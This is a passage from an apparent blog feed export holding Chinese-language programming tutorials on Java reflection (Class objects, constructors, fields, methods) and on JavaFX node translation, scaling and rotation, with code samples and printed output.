System.out.println(<span class="hljs-string">&quot;public say()&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 有参数的公有方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">(String words)</span>&#123;<br>        <span class="hljs-keyword">return</span> words;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="得到Class有三种方法"><a href="#得到Class有三种方法" class="headerlink" title="得到Class有三种方法"></a>得到<code>Class</code>有三种方法</h2><p>首先可以通过实例化对象调用<code>getClass</code>方法获取，如果获取了一个对象，但是不知道具体类就用这种方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">class1</span> <span class="hljs-operator">=</span> person1.getClass();<br></code></pre></td></tr></table></figure><p>然后可以通过<code>类名.class</code>获取，这种方法更方便安全可靠，性能更高，而且说明任何一个类都有一个隐含的静态成员变量<code>class</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class2</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><p>最后通过<code>Class</code>类的<code>forName</code>方法获取，这种用的最多，需要完整的类名，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">stringClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>Class</code>也是一个类，在JVM中，一个类只有一个<code>Class</code>实例化对象，即上面的<code>class1</code>、<code>class2</code>、<code>class3</code>都是相同的。</p><h2 id="通过反射实例化对象"><a href="#通过反射实例化对象" class="headerlink" title="通过反射实例化对象"></a>通过反射实例化对象</h2><p>上面已经得到了类的<code>Class</code>实例化对象，那么就可以通过这个对象创建类的对象，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">class3.newInstance();<br></code></pre></td></tr></table></figure><p><strong>注</strong>：<code>newInstance</code>方法内部实际上调用了<strong>无参数构造方法</strong>，必须保证无参构造存在才可以。否则会抛出<code>java.lang.InstantiationException</code>异常。</p><p>如果想要调用有参构造，可以通过<code>getConstructor</code>方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获得无参构造，由于没有参数，所以都是 null</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> class3.getConstructor(<span class="hljs-literal">null</span>).newInstance(<span class="hljs-literal">null</span>);<br><span class="hljs-comment">// Person@167cf4d</span><br>System.out.println(o);<br><span class="hljs-comment">// 获得有参构造，传入参数是Class数组，指定有参构造的参数类型，相应的，在 newInstance 实例化时需要传入参数</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> class3.getConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).newInstance(<span class="hljs-string">&quot;BB&quot;</span>);<br><span class="hljs-comment">// Person@a987ac</span><br>System.out.println(o2);<br><span class="hljs-comment">// 获得有参构造，这里指定了两个参数，所以获取类中寻找有两个参数的构造器</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o3</span> <span class="hljs-operator">=</span> class3.getConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">int</span>.class&#125;).newInstance(<span class="hljs-string">&quot;CC&quot;</span>, <span class="hljs-number">19</span>);<br><span class="hljs-comment">// Person@a3a380</span><br>System.out.println(o3);<br></code></pre></td></tr></table></figure><h2 id="获得属性"><a href="#获得属性" class="headerlink" title="获得属性"></a>获得属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获得 public 属性</span><br>Field[] fields = class3.getFields();<br>System.out.println(<span class="hljs-string">&quot;获得 public 属性&quot;</span>);<br><span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>    System.out.println(field.getName());<br>&#125;<br><span class="hljs-comment">// 获得类的所有属性</span><br>Field[] declaredFields = class3.getDeclaredFields();<br>System.out.println(<span class="hljs-string">&quot;获得所有属性&quot;</span>);<br><span class="hljs-keyword">for</span> (Field declaredField : declaredFields) &#123;<br>    System.out.println(declaredField.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p>获得指定属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获得属性</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> class3.getField(<span class="hljs-string">&quot;age&quot;</span>);<br><span class="hljs-comment">// public int Person.age</span><br>System.out.println(age);<br><span class="hljs-comment">// 获得私有属性</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> class3.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// private java.lang.String Person.name</span><br>System.out.println(name);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">newPerson</span> <span class="hljs-operator">=</span> class3.newInstance();<br>age.set(newPerson, <span class="hljs-number">20</span>);<br><span class="hljs-comment">// 启用和禁用访问安全检查的开关，值为 true，则表示反射的对象在使用时应该取消 java 语言的访问检查；反之不取消</span><br><span class="hljs-comment">// 如果不设置这个，将无法修改 私有属性</span><br>name.setAccessible(<span class="hljs-literal">true</span>);<br>name.set(newPerson, <span class="hljs-string">&quot;YY&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name.get(newPerson) + <span class="hljs-string">&quot; - age=&quot;</span> + age.get(newPerson));<br></code></pre></td></tr></table></figure><h2 id="获得方法"><a href="#获得方法" class="headerlink" title="获得方法"></a>获得方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获得类的 public 方法，会包括Object类的一些方法</span><br>Method[] methods = class3.getMethods();<br>System.out.println(<span class="hljs-string">&quot;获得 public 方法&quot;</span>);<br><span class="hljs-keyword">for</span> (Method method : methods) &#123;<br>    System.out.println(method.getName());<br>&#125;<br><span class="hljs-comment">// 获得类的所有方法</span><br>Method[] declaredMethods = class3.getDeclaredMethods();<br>System.out.println(<span class="hljs-string">&quot;获得所有方法&quot;</span>);<br><span class="hljs-keyword">for</span> (Method declaredMethod : declaredMethods) &#123;<br>    System.out.println(declaredMethod.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p>获得指定方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获得公有方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">say</span> <span class="hljs-operator">=</span> class3.getMethod(<span class="hljs-string">&quot;say&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-comment">// 调用方法</span><br>say.invoke(newPerson);<br><span class="hljs-comment">// 获得有参数的方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">say1</span> <span class="hljs-operator">=</span> class3.getMethod(<span class="hljs-string">&quot;say&quot;</span>, String.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (String) say1.invoke(newPerson, <span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(hello);<br><span class="hljs-comment">// 获得私有方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> class3.getDeclaredMethod(<span class="hljs-string">&quot;eat&quot;</span>, <span class="hljs-literal">null</span>);<br>eat.setAccessible(<span class="hljs-literal">true</span>);<br>eat.invoke(newPerson);<br></code></pre></td></tr></table></figure><h2 id="获得构造器"><a href="#获得构造器" class="headerlink" title="获得构造器"></a>获得构造器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取构造方法</span><br>Constructor[] constructors = class3.getConstructors();<br><span class="hljs-keyword">for</span> (Constructor constructor : constructors) &#123;<br>    System.out.println(constructor);<br>&#125;<br><span class="hljs-comment">// s</span><br><span class="hljs-comment">// public Person()</span><br><span class="hljs-comment">// public Person(java.lang.String,int)</span><br><span class="hljs-comment">// public Person(java.lang.String)</span><br></code></pre></td></tr></table></figure><h2 id="获取类的父类及其实现的接口"><a href="#获取类的父类及其实现的接口" class="headerlink" title="获取类的父类及其实现的接口"></a>获取类的父类及其实现的接口</h2><p>直接通过反射获取子类的对象是不能得到父类的属性值的，必须根据反射获得的子类 Class 对象在调用 <code>getSuperclass</code> 方法获取父类对象，然后在通过父类对象去获取父类的属性值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">Class</span> <span class="hljs-variable">subClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br><span class="hljs-comment">// 获取父类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> subClass.getSuperclass();<br><span class="hljs-comment">// 获取实现的接口</span><br>Class[] interfaces = subClass.getInterfaces();<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>灵活使用反射能让代码更加灵活，这里比如JDBC原生代码注册驱动，hibernate 的实体类，Spring 的 AOP等等都有反射的实现。但是凡事都有两面性，反射也会消耗系统的性能，增加复杂性等，合理使用才是真！</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>java反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[javafx] 组件位移、缩放、旋转、变形</title>
    <link href="/2022/10/05/%5Bjavafx%5D%20%E7%BB%84%E4%BB%B6%E4%BD%8D%E7%A7%BB%E3%80%81%E7%BC%A9%E6%94%BE%E3%80%81%E6%97%8B%E8%BD%AC%E3%80%81%E5%8F%98%E5%BD%A2/"/>
    <url>/2022/10/05/%5Bjavafx%5D%20%E7%BB%84%E4%BB%B6%E4%BD%8D%E7%A7%BB%E3%80%81%E7%BC%A9%E6%94%BE%E3%80%81%E6%97%8B%E8%BD%AC%E3%80%81%E5%8F%98%E5%BD%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="组件位移、缩放、旋转、变形"><a href="#组件位移、缩放、旋转、变形" class="headerlink" title="组件位移、缩放、旋转、变形"></a>组件位移、缩放、旋转、变形</h1><h2 id="组件位移"><a href="#组件位移" class="headerlink" title="组件位移"></a>组件位移</h2><p>在组件创建的时候，可以通过很多方法来设置其位置，比如在<code>AnchorPane</code>中可以设置与边框的距离，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">AnchorPane.setTopAnchor(node, value);<br>AnchorPane.setLeftAnchor(node, value);<br>AnchorPane.setBottomAnchor(node, value);<br>AnchorPane.setRightAnchor(node, value);<br></code></pre></td></tr></table></figure><p>或者也可以指定一个坐标，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">node.setLayoutX(x);<br>node.setLayoutY(y);<br></code></pre></td></tr></table></figure><p>注意设置坐标时的基准是父节点位置。</p><p>如果想要组件发生位移，即根据当前的位置移动到另一个位置，可以使用<code>Translate</code>。注意这里使用的是<strong>位移</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Translate</span> <span class="hljs-variable">translate1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Translate</span>(x, y);<br>node.setTransforms().add(translate1);<br><span class="hljs-comment">// 或者下面是等效的</span><br>node.setTranslateX(x);<br>node.setTranslateY(y);<br></code></pre></td></tr></table></figure><p>这样就可以让节点在当前位置的基础上位移<code>(x,y)</code>的距离。</p><p>如何得到当前节点的各种位置？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">Translate</span> <span class="hljs-variable">translate1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Translate</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);<br>    <span class="hljs-type">Translate</span> <span class="hljs-variable">translate2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Translate</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button2&quot;</span>);<br>    b2.setPrefWidth(<span class="hljs-number">100</span>);<br>    b2.setPrefHeight(<span class="hljs-number">100</span>);<br>    <span class="hljs-comment">// 设置坐标</span><br>    b2.setLayoutX(<span class="hljs-number">100</span>);<br>    b2.setLayoutY(<span class="hljs-number">100</span>);<br>    <span class="hljs-comment">// 进行位移</span><br>    b2.getTransforms().addAll(translate1, translate2);<br>    <span class="hljs-comment">// b2.setTranslateX(100);</span><br>    <span class="hljs-comment">// b2.setTranslateY(100);</span><br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button1&quot;</span>);<br>    b1.setPrefWidth(<span class="hljs-number">100</span>);<br>    b1.setPrefHeight(<span class="hljs-number">100</span>);<br>    b1.setLayoutX(<span class="hljs-number">100</span>);<br>    b1.setLayoutY(<span class="hljs-number">100</span>);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    anchorPane.setLayoutX(<span class="hljs-number">100</span>);<br>    anchorPane.setLayoutY(<span class="hljs-number">100</span>);<br>    anchorPane.setPrefWidth(<span class="hljs-number">400</span>);<br>    anchorPane.setPrefHeight(<span class="hljs-number">400</span>);<br>    anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #198f91;&quot;</span>);<br><br>    anchorPane.getChildren().addAll(b1, b2);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">800</span>);<br>    primaryStage.setWidth(<span class="hljs-number">800</span>);<br>    primaryStage.show();<br>    <span class="hljs-comment">// 100.0 - 100.0  创建节点值设置的坐标</span><br>    System.out.println(b2.getLayoutX() + <span class="hljs-string">&quot; - &quot;</span> + b2.getLayoutY());<br>    <span class="hljs-comment">// 300.0 - 300.0  相较于父节点且位移后的坐标</span><br>    System.out.println(b2.getLocalToParentTransform().getTx() + <span class="hljs-string">&quot; - &quot;</span> + b2.getLocalToParentTransform().getTy());<br>    <span class="hljs-comment">// 400.0 - 400.0  相较于Scene的坐标</span><br>    System.out.println(b2.getLocalToSceneTransform().getTx() + <span class="hljs-string">&quot; - &quot;</span> + b2.getLocalToSceneTransform().getTy());<br><br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd2</span> <span class="hljs-operator">=</span> b2.getLayoutBounds();<br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd3</span> <span class="hljs-operator">=</span> b2.localToParent(bd2);<br>    <span class="hljs-comment">// 300.0 - 300.0  组件左上角相较于父节点左上角的坐标</span><br>    System.out.println(bd3.getMinX() + <span class="hljs-string">&quot; - &quot;</span> + bd3.getMinY());<br>    <span class="hljs-comment">// 400.0 - 400.0  组件右下角相较于父节点左上角的坐标</span><br>    System.out.println(bd3.getMaxX() + <span class="hljs-string">&quot; - &quot;</span> + bd3.getMaxY());<br><br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd4</span> <span class="hljs-operator">=</span> b2.localToScreen(bd2);<br>    <span class="hljs-comment">// 860.6666771185998 - 503.3333363942886  组件左上角相较于屏幕左上角的坐标</span><br>    System.out.println(bd4.getMinX() + <span class="hljs-string">&quot; - &quot;</span> + bd4.getMinY());<br>    <span class="hljs-comment">// 960.6666811714076 - 603.3333400751881  组件右下角相较于屏幕左上角的坐标</span><br>    System.out.println(bd4.getMaxX() + <span class="hljs-string">&quot; - &quot;</span> + bd4.getMaxY());<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221005174356521.png" alt="image-20221005174356521"></p><h2 id="组件缩放"><a href="#组件缩放" class="headerlink" title="组件缩放"></a>组件缩放</h2><p>组件缩放使用<code>Scale</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button1&quot;</span>);<br>    b1.setPrefHeight(<span class="hljs-number">200</span>);<br>    b1.setPrefWidth(<span class="hljs-number">200</span>);<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button2&quot;</span>);<br>    b2.setStyle(<span class="hljs-string">&quot;-fx-background-color: #0cda0c;&quot;</span>);<br>    b2.setPrefHeight(<span class="hljs-number">200</span>);<br>    b2.setPrefWidth(<span class="hljs-number">200</span>);<br>    <span class="hljs-comment">// 四个参数分别为：x轴缩放比例 y轴缩放比例 x轴缩放原点 y轴缩放原点</span><br>    <span class="hljs-type">Scale</span> <span class="hljs-variable">scale</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scale</span>(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);<br>    b2.getTransforms().add(scale);<br>    <span class="hljs-comment">// 这种方法只能以中心点为原点</span><br>      b2.setScaleX(<span class="hljs-number">0.5</span>);<br>      b2.setScaleY(<span class="hljs-number">0.5</span>);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    root.getChildren().addAll(b1, b2);<br><br>    AnchorPane.setTopAnchor(b1, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b1, <span class="hljs-number">100.0</span>);<br><br>    AnchorPane.setTopAnchor(b2, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b2, <span class="hljs-number">100.0</span>);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(root);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">800</span>);<br>    primaryStage.setWidth(<span class="hljs-number">800</span>);<br>    primaryStage.show();<br><br>    <span class="hljs-comment">// 200.0 - 200.0  获得预设大小</span><br>    System.out.println(b2.getPrefHeight() + <span class="hljs-string">&quot; - &quot;</span> + b2.getPrefWidth());<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd2</span> <span class="hljs-operator">=</span> b2.getLayoutBounds();<br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd3</span> <span class="hljs-operator">=</span> b2.localToParent(bd2);<br>    <span class="hljs-comment">// 100.0 - 100.0  缩放后的大小</span><br>    System.out.println(bd3.getWidth() + <span class="hljs-string">&quot; - &quot;</span> + bd3.getHeight());<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221005180956969.png" alt="image-20221005180956969"></p><h2 id="组件旋转"><a href="#组件旋转" class="headerlink" title="组件旋转"></a>组件旋转</h2><p>组件旋转使用<code>Rotate</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button1&quot;</span>);<br>    b1.setPrefHeight(<span class="hljs-number">200</span>);<br>    b1.setPrefWidth(<span class="hljs-number">200</span>);<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button2&quot;</span>);<br>    b2.setStyle(<span class="hljs-string">&quot;-fx-background-color: #0cda0c;&quot;</span>);<br>    b2.setPrefHeight(<span class="hljs-number">200</span>);<br>    b2.setPrefWidth(<span class="hljs-number">200</span>);<br>    <span class="hljs-comment">// 参数分别是：旋转角度  原点X坐标  原点Y坐标</span><br>    <span class="hljs-type">Rotate</span> <span class="hljs-variable">rotate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rotate</span>(<span class="hljs-number">45</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);<br>    b2.getTransforms().add(rotate);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    root.getChildren().addAll(b1, b2);<br><br>    AnchorPane.setTopAnchor(b1, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b1, <span class="hljs-number">100.0</span>);<br><br>    AnchorPane.setTopAnchor(b2, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b2, <span class="hljs-number">100.0</span>);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(root);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">800</span>);<br>    primaryStage.setWidth(<span class="hljs-number">800</span>);<br>    primaryStage.show();<br>    <span class="hljs-comment">// 200.0 - 58.57864376269049  旋转后的左上角坐标</span><br>    System.out.println(b2.getLocalToParentTransform().getTx() + <span class="hljs-string">&quot; - &quot;</span> + b2.getLocalToParentTransform().getTy());<br><br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd2</span> <span class="hljs-operator">=</span> b2.getLayoutBounds();<br>    <span class="hljs-type">Bounds</span> <span class="hljs-variable">bd3</span> <span class="hljs-operator">=</span> b2.localToParent(bd2);<br>    <span class="hljs-comment">// 58.578643798828125 - 58.578643798828125  这是转换后形成的外边框（虽然看不到）的坐标</span><br>    System.out.println(bd3.getMinX() + <span class="hljs-string">&quot; - &quot;</span> + bd3.getMinY());<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221005182347573.png" alt="image-20221005182347573"></p><h2 id="组件变形"><a href="#组件变形" class="headerlink" title="组件变形"></a>组件变形</h2><p><code>Shear</code>类表示按指定乘数剪切坐标的仿射对象。</p><p><del>感觉没什么用 